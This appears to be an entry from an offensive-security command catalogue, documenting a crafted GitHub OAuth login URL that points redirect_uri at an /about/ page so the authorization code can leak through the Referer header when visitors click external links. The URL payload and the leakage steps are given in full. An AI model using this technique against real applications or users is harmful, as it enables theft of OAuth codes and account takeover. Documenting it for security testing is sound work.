---
id: uuid-github-about
data: >-
  https://github.com/login?client_id=5f45cc999f7812d0b6d2&return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3D5f45cc999f7812d0b6d2%26redirect_uri%3Dhttps%253A%252F%252Fedoverflow.com%252Fabout%252f%26scope%3Dpublic_repo
tags:
  - oauth
  - leakage
type: command
output: null
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:35.827Z'
verified: false
validated: true
submitted: true
---
# github-oauth-manipulate-redirect-to-about

## Command

```bash
# Browser visit or curl -L
https://github.com/login?client_id=5f45cc999f7812d0b6d2&return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3D5f45cc999f7812d0b6d2%26redirect_uri%3Dhttps%253A%252F%252Fedoverflow.com%252Fabout%252f%26scope%3Dpublic_repo
```

## Description

Starts OAuth flow redirecting to /about/ page with external links, keeping code in URL for potential Referer leakage on clicks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| client_id | App ID | Yes |
| return_to | Encoded auth request | Yes |
| redirect_uri | Encoded /about/ path | Yes |
| scope | public_repo | Yes |

## Examples

### Basic Usage

```bash
https://github.com/login/oauth/authorize?...&redirect_uri=https%3A%2F%2Fedoverflow.com%2Fabout%2F
```

### Advanced Usage

Use full return_to encoding for precise control.

## Expected Output

Auth redirect to https://edoverflow.com/about/?code=...; click links to leak via Referer to twitter.com, etc.

## Related

- [[commands/github-oauth-manipulate-redirect-to-arbitrary]]
- [[procedures/Initiate-OAuth-and-Leak-Code-via-Referer]]
